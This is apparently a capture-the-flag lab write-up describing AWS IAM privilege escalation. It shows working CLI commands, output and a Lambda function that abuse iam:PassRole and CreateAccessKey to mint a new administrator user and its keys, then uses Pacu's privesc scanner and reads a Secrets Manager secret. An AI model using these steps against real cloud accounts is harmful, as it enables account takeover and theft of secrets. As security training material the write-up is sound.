#  Mapper (AWS HSM LAB)
##  **Objective**

Perform an AWS penetration test against a client's account, auditing all IAM Users and identifying privilege escalation paths. The goal is to retrieve a flag stored in AWS Secrets Manager that is only accessible to administrators.

## **Initial Access**

The client provided an Access Key and Secret for the starting user `cg-pentest-lab` with the following permissions:

### **Starting User Permissions**

**Attached Policies:**

- `IAMReadOnlyAccess` - Read-only access to IAM resources

**Inline Policies:**

- `cg-pentest-create-access-key-lab` - Ability to create access keys for any IAM user

```
2026-08-30 00:04:32,184 - 4392 - [INFO] User "cg-pentest-lab" has 1 attached policies
2026-08-30 00:04:32,184 - 4392 - [INFO] -- Policy "IAMReadOnlyAccess" (arn:aws:iam::aws:policy/IAMReadOnlyAccess)
2026-08-30 00:04:32,338 - 4392 - [INFO] User "cg-pentest-lab" has 1 inline policies
2026-08-30 00:04:32,339 - 4392 - [INFO] -- Policy "cg-pentest-create-access-key-lab"
```

## **Reconnaissance Phase**

### **Step 1: Enumerate IAM Users**

Using the `initial_access` profile, I enumerated all IAM users to identify those with potentially exploitable permissions.

```
aws iam list-users --profile initial_access --region us-east-1
```

### **Step 2: Discover Privileged User**

During enumeration, I identified `cg-hdktnuaa-lab` with interesting permissions:

```
{
    "Path": "/",
    "UserName": "cg-hdktnuaa-lab",
    "UserPolicyList": [
        {
            "PolicyName": "cg-lambda-developer-policy-lab",
            "PolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Action": [
                            "lambda:CreateFunction",
                            "lambda:InvokeFunction"
                        ],
                        "Effect": "Allow",
                        "Resource": "*"
                    },
                    {
                        "Action": "iam:PassRole",
                        "Effect": "Allow",
                        "Resource": "arn:aws:iam::946925698533:role/cg-LambdaAdminExecutionRole-lab"
                    }
                ]
            }
        }
    ]
}
```

**Key Findings:**

- `lambda:CreateFunction` - Can create Lambda functions
- `lambda:InvokeFunction` - Can invoke Lambda functions
- `iam:PassRole` - Can pass the `cg-LambdaAdminExecutionRole-lab` role to Lambda functions

This combination allows privilege escalation by creating a Lambda function with the admin role.

## **Privilege Escalation Path**

### **Step 3: Create Access Keys for Target User**

Since `cg-pentest-lab` has the `cg-pentest-create-access-key-lab` policy, I created access keys for `cg-hdktnuaa-lab`:

```
aws iam create-access-key \
    --user-name cg-hdktnuaa-lab \
    --profile initial_access \
    --region us-east-1
```

```
{
    "AccessKey": {
        "UserName": "cg-hdktnuaa-lab",
        "AccessKeyId": "$access_key",
        "Status": "Active",
        "SecretAccessKey": "$secret-key",
        "CreateDate": "2026-08-29T23:07:12+00:00"
    }
}
```

### **Step 4: Configure Profile for Target User**

```
aws configure --profile cg-hdktnuaa-lab
AWS Access Key ID [None]: $access_key
AWS Secret Access Key [None]: $secret-key
Default region name [None]: us-east-1
Default output format [None]: json
```

Verify the profile works:

```
aws sts get-caller-identity --profile cg-hdktnuaa-lab
```

```
{
    "UserId": "AIDA5Y6JLPXSS4TOQWJFJ",
    "Account": "946925698533",
    "Arn": "arn:aws:iam::946925698533:user/cg-hdktnuaa-lab"
}
```

### **Step 5: Create Malicious Lambda Function**

Created a Python Lambda function that:

1. Creates a new IAM user
2. Attaches the `AdministratorAccess` policy
3. Returns the new user's access credentials

**lambda_function.py:**

```
import boto3
import json
import time

def lambda_handler(event, context):
    iam = boto3.client('iam')

    # Create a new admin user
    username = f"admin-{int(time.time())}"

    try:
        # Create the user
        iam.create_user(UserName=username)
        print(f"Created user:{username}")

        # Attach AdministratorAccess policy
        iam.attach_user_policy(
            UserName=username,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        print(f"Attached AdministratorAccess to{username}")

        # Create access keys
        keys = iam.create_access_key(UserName=username)
        print(f"Created access keys for{username}")

        return {
            'statusCode': 200,
            'body': json.dumps({
                'UserName': username,
                'AccessKeyId': keys['AccessKey']['AccessKeyId'],
                'SecretAccessKey': keys['AccessKey']['SecretAccessKey']
            })
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})
        }
```

### **Step 6: Package and Deploy Lambda Function**

Compress the function:

```
zip function.zip lambda_function.py
```

Create the Lambda function with the privileged role:

```
aws lambda create-function \
    --function-name privesc-attack-lab \
    --runtime python3.9 \
    --role arn:aws:iam::946925698533:role/cg-LambdaAdminExecutionRole-lab \
    --handler lambda_function.lambda_handler \
    --zip-file fileb://function.zip \
    --profile cg-hdktnuaa-lab \
    --region us-east-1
```

**Success Output:**

```
{
    "FunctionName": "privesc-attack-lab",
    "FunctionArn": "arn:aws:lambda:us-east-1:946925698533:function:privesc-attack-lab",
    "Runtime": "python3.9",
    "Role": "arn:aws:iam::946925698533:role/cg-LambdaAdminExecutionRole-lab",
    "Handler": "lambda_function.lambda_handler",
    "CodeSize": 605,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2026-08-29T23:10:29.529+0000",
    "Version": "$LATEST"
}
```

### **Step 7: Invoke Lambda Function**

Invoke the function to create the admin user:

```
aws lambda invoke \
    --function-name privesc-attack-lab \
    --payload '{}' \
    --profile cg-hdktnuaa-lab \
    --region us-east-1 \
    output.json
```

```
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

**Retrieve Admin Credentials:**

```
cat output.json | jq .
```

```
{
  "statusCode": 200,
  "body": "{\"UserName\": \"admin-1788045141\", \"AccessKeyId\": \"$access_key\", \"SecretAccessKey\": \"$secret-key\"}"
}
```

### **Step 8: Verify Admin Access**

Check the new admin user's permissions:

```
2026-08-30 00:19:00,208 - 4392 - [INFO] User "admin-1788045141" has 1 attached policies
2026-08-30 00:19:00,208 - 4392 - [INFO] -- Policy "AdministratorAccess" (arn:aws:iam::aws:policy/AdministratorAccess)
```

Configure the admin profile:

```
aws configure --profile admin-1788045141
AWS Access Key ID [None]: $access_key
AWS Secret Access Key [None]: $secret-key
Default region name [None]: us-east-1
Default output format [None]: json
```

Verify identity:

```
aws sts get-caller-identity --profile admin-1788045141
```

```
{
    "UserId": "AIDA5Y6JLPXSXSGRFS252",
    "Account": "946925698533",
    "Arn": "arn:aws:iam::946925698533:user/admin-1788045141"
}
```

## **Advanced Privilege Escalation with Pacu**

### **Step 9: Using Pacu's Automatic Privesc Scanner**

I also used Pacu's `iam__privesc_scan` module to automate privilege escalation:

```
Pacu (mapper:imported-admin-1788045141) > run iam__privesc_scan
```

The module identified multiple confirmed escalation paths:

```
[iam__privesc_scan] CONFIRMED: AddUserToGroup
[iam__privesc_scan] CONFIRMED: AttachGroupPolicy
[iam__privesc_scan] CONFIRMED: AttachRolePolicy
[iam__privesc_scan] CONFIRMED: PassExistingRoleToNewLambdaThenInvoke
[iam__privesc_scan] CONFIRMED: CreateAccessKey
```

I selected the role-based escalation method:

```
[iam__privesc_scan] Found 10 roles. Choose one below.
[iam__privesc_scan]   [7] cg-LambdaAdminExecutionRole-lab
Choose an option: 7
```

The module successfully attached an administrator policy to the role:

```
[iam__privesc_scan] Successfully attached an administrator policy to role cg-LambdaAdminExecutionRole-lab!
That role should now have administrator access.
```

## **Retrieve the Flag**

### **Step 10: Find the Secret**

List all secrets in AWS Secrets Manager:

```
aws secretsmanager list-secrets --profile admin-1788045141 --region us-east-1
```

```
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:946925698533:secret:cg-admin-flag-lab-o5Mhku",
            "Name": "cg-admin-flag-lab",
            "Description": "Administrative access verification flag",
            "LastChangedDate": "2026-08-29T23:59:25.819000+01:00",
            "LastAccessedDate": "2026-08-29T01:00:00+01:00",
            "SecretVersionsToStages": {
                "terraform-gEpKUCxejz0aOpO0MqcZ5Fmwm6": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2026-08-29T23:59:18.152000+01:00"
        }
    ]
}
```

### **Step 11: Retrieve the Flag**

```
aws secretsmanager get-secret-value \
    --secret-id cg-admin-flag-lab \
    --profile admin-1788045141 \
    --region us-east-1
```

```
{
    "ARN": "arn:aws:secretsmanager:us-east-1:946925698533:secret:cg-admin-flag-lab-o5Mhku",
    "Name": "cg-admin-flag-lab",
    "VersionId": "terraform-gEpKUCxejz0aOpO0MqcZ5Fmwm6",
    "SecretString": "HSM{}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2026-08-29T23:59:25.815000+01:00"
}
```

**🏴 Flag Retrieved: `HSM{}`**

## **Attack Path Summary**

```
cg-pentest-lab (Initial Access)
    └── IAMReadOnlyAccess + cg-pentest-create-access-key-lab
        └── Created keys for cg-hdktnuaa-lab
            └── cg-lambda-developer-policy-lab
                ├── lambda:CreateFunction
                ├── lambda:InvokeFunction
                └── iam:PassRole → cg-LambdaAdminExecutionRole-lab
                    └── Created Lambda function with admin role
                        └── Lambda created admin-1788045141
                            └── AdministratorAccess policy attached
                                └── Retrieved flag from Secrets Manager
```
